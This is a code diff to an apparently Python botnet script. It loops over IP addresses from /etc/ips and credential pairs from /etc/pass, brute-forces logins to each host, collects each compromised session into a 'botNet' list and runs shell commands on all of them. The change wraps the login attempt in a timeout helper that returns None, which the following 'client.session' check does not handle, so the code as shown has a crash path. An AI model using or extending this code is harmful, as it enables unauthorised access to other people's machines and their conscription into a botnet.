@@ -50,10 +50,25 @@ def print_color(text, color):
     else:
         print(text + "\nColor not found!")
 
-def TimeoutHandler(signum, frame):
-    raise TimeoutException
+def timeoutFn(ip, user, passwd):
 
-OriginalHandler = signal.signal(signal.SIGALRM, TimeoutHandler)
+    class TimeoutError(Exception):
+        pass
+
+    def handler(signum, frame):
+        raise TimeoutError()
+
+    signal.signal(signal.SIGALRM, handler)
+    signal.alarm(6)
+    try:
+        result = Client(ip, user, passwd)
+    except TimeoutError as exc:
+        result = None
+    finally:
+        signal.alarm(0)
+
+    return result
+
 botNet = []
 
 with open('/etc/ips') as f:
@@ -65,8 +80,7 @@ with open('/etc/pass') as f:
 for ip in ips:
     for user, passwd in credentials:
         print_color("[*] Connecting to: " + user + "@" + ip + " P" + str(credentials.index([user , passwd]) + 1), "yellow")
-        signal.alarm(6)
-        client = Client(ip, user, passwd)
+        client = timeoutFn(ip, user, passwd)
         if client.session is None:
             pass
         else:
@@ -75,4 +89,4 @@ for ip in ips:
             botNet.append(client)
             break
 
-botnetCommand("ls")
+botnetCommand("ls -la")
